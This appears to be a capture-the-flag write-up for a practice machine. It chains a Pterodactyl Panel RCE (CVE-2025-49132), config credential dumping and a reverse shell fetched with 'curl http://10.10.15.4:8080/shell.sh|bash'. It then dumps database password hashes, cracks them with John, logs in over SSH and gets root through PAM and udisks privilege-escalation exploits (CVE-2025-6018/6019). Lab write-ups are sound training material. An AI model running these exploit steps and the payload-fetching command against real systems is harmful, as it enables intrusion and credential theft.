# Flags
- User
	- 21c43d3b578be90a6d326c04d4b9e968
- Root
	- 028be0fd1e973b31b91fdfbb7097bad3


# Notes
- First, we will do a scan
```
rustscan --ulimit 5000 --addresses "10.129.19.39" --top -- -sC -sV
```
- From the results, we can see that we have a SSH and a web server pointing towards a domain named pterodactyl.htb
```
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)  
| ssh-hostkey:    
|   256 a3741ea3ad02140100e6abb4188416e0 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOouXDOkVrDkob+tyXJOHu3twWDqor3xlKgyYmLIrPasaNjhBW/xkGT2otP1zmnkTUyGfzEWZGkZB2Jkaivmjgc=  
|   256 65c833177ad6523d63c3e4a960642dcc (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTXNuX5oJaGQJfvbga+jM+14w5ndyb0DN0jWJHQCDd9  
80/tcp open  http    syn-ack ttl 63 nginx 1.21.5  
|_http-title: Did not follow redirect to http://pterodactyl.htb/  
|_http-server-header: nginx/1.21.5  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS
```
- So, we can go ahead and add that into our /etc/hosts
```
10.129.19.39    pterodactyl.htb
```
- Visiting the website, looks like you average advertisement for a Minecraft server.
- Since it's a Minecraft server, then some sort of admin panel could exist here.
- After all, Pterodactyl is also the name for a dashboard that can be used for game servers, which includes Minecraft
- I will go ahead and run a gobuster instance to find anything
```
gobuster dir -w `fzf-wordlists` -u http://pterodactyl.htb
```
- While that goes, we are able to find a changelog with some more juicy information
```
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```
- Doing research, we learn that this version of Pterodactyl does have a vulnerability in it, that allows for remote code execution
	- https://nvd.nist.gov/vuln/detail/CVE-2025-49132
- It also seems like we have PHP + a MariaDB database going on, so our PHP reverse shells and stuff like that could work good here
- Looking at gobuster, only a subdomain named Public shows up, and that leads to a 403 Forbidden error.
```
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://pterodactyl.htb  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /opt/lists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/Public               (Status: 301) [Size: 169] [--> http://pterodactyl.htb/Public/]
```
- Oh well. Let's try subdomains now
```
gobuster vhost -u "http://pterodactyl.htb" -w `fzf-wordlists` --append-domain
```
- Aha! We have found our panel!
```
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                       http://pterodactyl.htb  
[+] Method:                    GET  
[+] Threads:                   10  
[+] Wordlist:                  /opt/lists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  
[+] User Agent:                gobuster/3.8  
[+] Timeout:                   10s  
[+] Append Domain:             true  
[+] Exclude Hostname Length:   false  
===============================================================  
Starting gobuster in VHOST enumeration mode  
===============================================================  
panel.pterodactyl.htb Status: 200 [Size: 1897]
```
- Visting the website, we are greeted with a login screen
- Doing some research, it appears that Pterodactyl doesn't use default credentials, so nothing that can be done there
- Looking more online, I was able to find some PoCs for CVE-2025-49132, so I think I will go ahead and start exploitation
	- https://github.com/63square/CVE-2025-49132
- Using these tools, I was able to confirm the existence of the vulnerability using the test
```
[Feb 10, 2026 - 19:54:00 (PST)] exegol-htb-season CVE-2025-49132 # python3 test.py http://panel.pterodactyl.htb  
Target is vulnerable!
```
- Cool, let's go ahead and dump the database out
```
[Feb 10, 2026 - 19:55:14 (PST)] exegol-htb-season CVE-2025-49132 # python3 dump-creds.py http://panel.pterodactyl.htb  
Target is vulnerable!  
App key: base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=  
  
-- Database config --  
{'default': 'mysql', 'connections': {'mysql': {'driver': 'mysql', 'url': '', 'host': '127.0.0.1', 'port': '3306', 'database': 'panel', 'username': 'pterodactyl', 'password': 'PteraPanel', 'unix_socket': '', 'charset': 'utf8mb4', 'collat  
ion': 'utf8mb4_unicode_ci', 'prefix': '', 'prefix_indexes': '1', 'strict': '', 'timezone': '+00{{00}}', 'sslmode': 'prefer', 'options': {'1014': '1'}}}, 'migrations': 'migrations', 'redis': {'client': 'predis', 'options': {'cluster': 'r  
edis', 'prefix': 'pterodactyl_database_'}, 'default': {'scheme': 'tcp', 'path': '/run/redis/redis.sock', 'host': '127.0.0.1', 'username': '', 'password': '', 'port': '6379', 'database': '0', 'context': []}, 'sessions': {'scheme': 'tcp',  
'path': '/run/redis/redis.sock', 'host': '127.0.0.1', 'username': '', 'password': '', 'port': '6379', 'database': '1', 'context': []}}}  
  
-- Filesystem config --  
{'default': 'local', 'disks': {'local': {'driver': 'local', 'root': '/var/www/pterodactyl/storage/app', 'throw': ''}, 'public': {'driver': 'local', 'root': '/var/www/pterodactyl/storage/app/public', 'url': 'http://panel.pterodactyl.htb/  
storage', 'visibility': 'public', 'throw': ''}, 's3': {'driver': 's3', 'key': '', 'secret': '', 'region': '', 'bucket': '', 'url': '', 'endpoint': '', 'use_path_style_endpoint': '', 'throw': ''}}, 'links': {'/var/www/pterodactyl/public/  
storage': '/var/www/pterodactyl/storage/app/public'}}  
  
-- Mail config --  
{'default': 'smtp', 'mailers': {'smtp': {'transport': 'smtp', 'host': 'smtp.example.com', 'port': '25', 'encryption': 'tls', 'username': '', 'password': '', 'timeout': '', 'local_domain': 'panel.pterodactyl.htb'}, 'ses': {'transport': '  
ses'}, 'mailgun': {'transport': 'mailgun'}, 'postmark': {'transport': 'postmark'}, 'sendmail': {'transport': 'sendmail', 'path': '/usr/sbin/sendmail -bs -i'}, 'log': {'transport': 'log', 'channel': ''}, 'array': {'transport': 'array'},  
'failover': {'transport': 'failover', 'mailers': ['smtp', 'log']}}, 'from': {'address': 'no-reply@example.com', 'name': 'Pterodactyl Panel'}, 'markdown': {'theme': 'default', 'paths': ['/var/www/pterodactyl/resources/views/vendor/mail']  
}}
```
- Looks like I am able to pull out a credential set
	- pterodactyl:PteraPanel 
- I was also able to find the database name as well, along with the service running on 3306
	- pterodactyl:PteraPanel@127.0.0.1:3306/panel
- Well, it looks like it's on the inside, so no luck there.
- I think we are going to have to brute force our reverse shell in through this
	- https://github.com/malw0re/CVE-2025-49132---Pterodactyl-RCE-HTB-Season-10-
- I am then able to use this tool to get a reverse shell onto this box
```
[Feb 10, 2026 - 21:00:56 (PST)] exegol-htb-season CVE-2025-49132---Pterodactyl-RCE-HTB-Season-10- # python3 ape1.py --host panel.pterodactyl.htb --interactive  
  
╔═══════════════════════════════════════════════════════════╗  
║           CVE-2025-49132 PEAR RCE Exploit                ║  
║           Target: panel.pterodactyl.htb                       ║  
╚═══════════════════════════════════════════════════════════╝  
  
[+] Entering interactive shell mode  
[*] Type 'exit' or 'quit' to leave  
  
shell> curl http://10.10.15.4:8080/shell.sh|bash  
[*] Target: http://panel.pterodactyl.htb  
[*] PEAR Path: ../../../../../../usr/share/php/PEAR  
[*] Command: curl http://10.10.15.4:8080/shell.sh|bash  
  
[*] Writing payload to /tmp/shell.php...  
[+] Payload written  
[*] Executing payload...
```
- We are able to get a shell going
```
wwwrun@pterodactyl:/var/www/pterodactyl/public> whoami  
whoami  
wwwrun
```
- So, now from here, I was actually able to read out the user.txt file
```
wwwrun@pterodactyl:/home/phileasfogg3> cat user.txt  
cat user.txt  
21c43d3b578be90a6d326c04d4b9e968
```
- I will go ahead and upgrade my shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- I am unable to run sudo -l since I need a password, so I will go ahead and use LinEnum.sh to find anything
- I find something interesting in that we have access to filesystem commands and that udev is currently running
```
...
root     13355  0.0  0.2  43648  5420 ?        S    07:09   0:00 (udev-worker)
...
[-] SUID files:                                                                                                                                                                                                                                
-rwsr-x--- 1 root messagebus 56928 Jun 20  2023 /usr/lib/dbus-1/dbus-daemon-launch-helper                                                                                                                                                      
-rwsr-xr-x 1 root root 14512 Jul 15  2025 /usr/lib/polkit-1/polkit-agent-helper-1                                                                                                                                                              
-rwsr-xr-x 1 root root 302296 Jun 27  2025 /usr/bin/sudo                                                                                                                                                                                       
-rwsr-xr-x 1 root shadow 58528 Oct 17  2024 /usr/bin/chfn                                                                                                                                                                                      
-rwsr-xr-x 1 root shadow 44672 Oct 17  2024 /usr/bin/chsh                                                                                                                                                                                      
-rwsr-xr-x 1 root shadow 18856 Oct 17  2024 /usr/bin/expiry                                                                                                                                                                                    
-rwsr-xr-x 1 root shadow 70928 Oct 17  2024 /usr/bin/gpasswd                                                                                                                                                                                   
-rwsr-xr-x 1 root shadow 37288 Oct 17  2024 /usr/bin/newgidmap                                                                                                                                                                                 
-rwsr-xr-x 1 root root 36568 Oct 17  2024 /usr/bin/newgrp                                                                                                                                                                                      
-rwsr-xr-x 1 root shadow 37288 Oct 17  2024 /usr/bin/newuidmap                                                                                                                                                                                 
-rwsr-xr-x 1 root shadow 92256 Oct 17  2024 /usr/bin/passwd                                                                                                                                                                                    
-rwsr-xr-x 1 root root 59712 Sep  5  2024 /usr/bin/mount                                                                                                                                                                                       
-rwsr-xr-x 1 root root 76096 Sep  5  2024 /usr/bin/su                                                                                                                                                                                          
-rwsr-xr-x 1 root root 35136 Sep  5  2024 /usr/bin/umount                                                                                                                                                                                      
-rwsr-xr-x 1 root trusted 35616 Sep 17  2018 /usr/bin/fusermount                                                                                                                                                                               
-rwsr-xr-x 1 root trusted 60176 Jan 18  2023 /usr/bin/crontab                                                                                                                                                                                  
-rwsr-xr-x 1 root root 142288 Jun 16  2025 /sbin/mount.nfs                                                                                                                                                                                     
-rwsr-xr-x 1 root shadow 14768 Jan  9  2024 /sbin/unix2_chkpwd                                                                                                                                                                                 
-rwsr-xr-x 1 root shadow 35544 Jan  9  2024 /sbin/unix_chkpwd
```
- Looking online, a priv-esc vulnerability exists online
	- https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/
- However, it appears that we need a SSH connection for most PoCs, so we need to jump onto a system user
- So, I will go ahead and log into the database again, and it worked!
```
wwwrun@pterodactyl:/var/www/pterodactyl> mariadb -h 127.0.0.1 -u pterodactyl -p panel  
<actyl> mariadb -h 127.0.0.1 -u pterodactyl -p panel  
Enter password: PteraPanel  
  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Welcome to the MariaDB monitor.  Commands end with ; or \g.  
Your MariaDB connection id is 93  
Server version: 11.8.3-MariaDB MariaDB package  
  
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  
  
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
  
MariaDB [panel]>
```
- So, now I will go ahead and see if I can find any user tables
```
MariaDB [panel]> SHOW TABLES;  
SHOW TABLES;  
+-----------------------+  
| Tables_in_panel       |  
+-----------------------+  
| activity_log_subjects |  
| activity_logs         |  
| allocations           |  
| api_keys              |  
| api_logs              |  
| audit_logs            |  
| backups               |  
| database_hosts        |  
| databases             |  
| egg_mount             |  
| egg_variables         |  
| eggs                  |  
| failed_jobs           |  
| jobs                  |  
| locations             |  
| migrations            |  
| mount_node            |  
| mount_server          |  
| mounts                |  
| nests                 |  
| nodes                 |  
| notifications         |  
| password_resets       |  
| recovery_tokens       |  
| schedules             |  
| server_transfers      |  
| server_variables      |  
| servers               |  
| sessions              |  
| settings              |  
| subusers              |  
| tasks                 |  
| tasks_log             |  
| user_ssh_keys         |  
| users                 |  
+-----------------------+  
35 rows in set (0.001 sec)
```
- I am then able to dump the users table out
```
MariaDB [panel]> SELECT * FROM users;  
SELECT * FROM users;  
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+------------  
--------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+  
| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_to  
ken                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |  
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+------------  
--------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+  
|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehB  
Ydx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |  
|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9  
fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |  
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+------------  
--------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+  
2 rows in set (0.001 sec)
```
- From this dump, I am able to create two user credentials from this:
```
headmonitor:$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
phileasfogg3:$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
```
- I am able to pull out the passwords for these, but they are hashed.
- These appear to be bcrypt hashes, so we will need to crack these somehow
- We can use John the Ripper here for this
```
john --wordlist=`fzf-wordlists` --format=bcrypt headmonitor_hash

john --wordlist=`fzf-wordlists` --format=bcrypt phileasfogg3_hash
```
- However, I am going to try phileasfogg3 first since that is where I found the user flag first
- I was able to find their password!
```
[Feb 13, 2026 - 20:54:20 (PST)] exegol-htb-season Hashes # john --wordlist=`fzf-wordlists` --format=bcrypt phileasfogg3_hash    
Using default input encoding: UTF-8  
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])  
Cost 1 (iteration count) is 1024 for all loaded hashes  
Will run 32 OpenMP threads  
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)  
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
!QAZ2wsx         (?)        
1g 0:00:00:11 DONE (2026-02-13 20:55) 0.08511g/s 1201p/s 1201c/s 1201C/s gerber..aminah  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```
- With this information, we now have one set of full credentials
	- phileasfogg3:!QAZ2wsx
- So, with this information, I will try to SSH into the machine now, and this works!
```
[Feb 13, 2026 - 20:55:52 (PST)] exegol-htb-season Hashes # ssh phileasfogg3@10.129.5.98                  
The authenticity of host '10.129.5.98 (10.129.5.98)' can't be established.  
ED25519 key fingerprint is SHA256:FOOqnHbybkpXftYgyrorbBxkgW0L4yMSLYxG8F87SDE.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.129.5.98' (ED25519) to the list of known hosts.  
(phileasfogg3@10.129.5.98) Password:    
Have a lot of fun...  
Last login: Sat Feb 14 06:57:01 2026 from 10.10.14.127  
phileasfogg3@pterodactyl:~>
```
- Alright, cool! Now, we are able to use our priv-esc exploit now.
- First we need to setup the environment first, which we can do using this
	- https://www.exploit-db.com/exploits/52386
- So, let's get that set up
```
[Feb 15, 2026 - 21:36:04 (PST)] exegol-htb-seasons /workspace # python3 52386 -i 10.129.8.214 -u phileasfogg3 -p '!QAZ2wsx'  
2026-02-15 21:36:10 [WARNING] Use only with proper authorization!  
2026-02-15 21:36:10 [INFO] Starting CVE-2025-6018 exploit against 10.129.8.214:22  
2026-02-15 21:36:10 [INFO] Connecting to 10.129.8.214:22 as phileasfogg3  
2026-02-15 21:36:10 [INFO] Connected (version 2.0, client OpenSSH_9.6)  
2026-02-15 21:36:10 [INFO] Authentication (password) successful!  
2026-02-15 21:36:10 [INFO] SSH connection established  
2026-02-15 21:36:10 [INFO] Starting vulnerability assessment  
2026-02-15 21:36:10 [INFO] Executing check: pam_version  
2026-02-15 21:36:11 [INFO] Vulnerable PAM version detected: pam-1.3.0  
2026-02-15 21:36:12 [INFO] Executing check: pam_env  
2026-02-15 21:36:12 [INFO] pam_env.so configuration found  
2026-02-15 21:36:12 [INFO] Executing check: pam_systemd  
2026-02-15 21:36:13 [INFO] pam_systemd.so found - escalation vector available  
2026-02-15 21:36:13 [INFO] Executing check: systemd_version  
2026-02-15 21:36:14 [INFO] Target appears vulnerable, proceeding with exploitation  
2026-02-15 21:36:14 [INFO] Creating malicious environment file  
2026-02-15 21:36:14 [INFO] Writing .pam_environment file  
2026-02-15 21:36:15 [INFO] Malicious environment file created successfully  
2026-02-15 21:36:15 [INFO] Reconnecting to trigger PAM environment loading  
2026-02-15 21:36:17 [INFO] Connected (version 2.0, client OpenSSH_9.6)  
2026-02-15 21:36:17 [INFO] Authentication (password) successful!  
2026-02-15 21:36:17 [INFO] Reconnection successful  
2026-02-15 21:36:17 [INFO] Testing privilege escalation vectors  
2026-02-15 21:36:17 [INFO] Testing: SystemD Reboot  
2026-02-15 21:36:18 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Reboot  
2026-02-15 21:36:18 [INFO] Testing: SystemD Shutdown  
2026-02-15 21:36:18 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Shutdown  
2026-02-15 21:36:18 [INFO] Testing: PolicyKit Check  
2026-02-15 21:36:19 [INFO] No escalation detected: PolicyKit Check  
2026-02-15 21:36:19 [INFO] EXPLOITATION SUCCESSFUL - Privilege escalation confirmed  
2026-02-15 21:36:19 [INFO] Starting interactive shell session  
  
--- Interactive Shell ---  
Commands: 'exit' to quit, 'status' for privilege check  
exploit$
```
- We can go ahead and run that to take advantage of  that now
	- https://github.com/guinea-offensive-security/CVE-2025-6019
- We can then generate our image, and then transfer that plus the script onto the system.
- We can then run it to take advantage of the exploit and get a root shell
```
phileasfogg3@pterodactyl:/tmp> ./exploit.sh    
PoC for CVE-2025-6019 (LPE via libblockdev/udisks)  
WARNING: Only run this on authorized systems. Unauthorized use is illegal.  
Continue? [y/N]: y  
[*] Checking for vulnerable libblockdev/udisks versions...  
[*] Detected udisks version: unknown  
[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.  
[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.  
[!] Continuing with PoC execution...  
Select mode:  
[L]ocal: Create 300 MB XFS image (requires root)  
[C]ible: Exploit target system  
[L]ocal or [C]ible? (L/C): C  
[+] All dependencies are installed.  
[*] Starting exploitation on target machine...  
[*] Checking allow_active status...  
[+] allow_active status confirmed.  
[*] Verifying xfs.image integrity...  
[*] Stopping gvfs-udisks2-volume-monitor...  
[*] Note: gvfs-udisks2-volume-monitor was not running.  
[*] Setting up loop device...  
[+] Loop device configured: /dev/loop0  
[*] Keeping filesystem busy to prevent unmounting...  
[+] Background loop started (PID: 11090)  
[*] Resizing filesystem to trigger mount...  
[+] Mount successful (expected error: target is busy).  
[*] Waiting 2 seconds for mount to stabilize...  
[*] Checking for SUID bash in /tmp/blockdev*...  
[+] SUID bash found: /tmp/blockdev.V2XXK3/bash  
-rwsr-xr-x 1 root root 1012656 Feb 16 07:50 /tmp/blockdev.V2XXK3/bash  
[*] Executing root shell...  
bash-4.4# whoami  
root
```
- Now we can get our root flag!
```
bash-4.4# cat root.txt    
028be0fd1e973b31b91fdfbb7097bad3
```
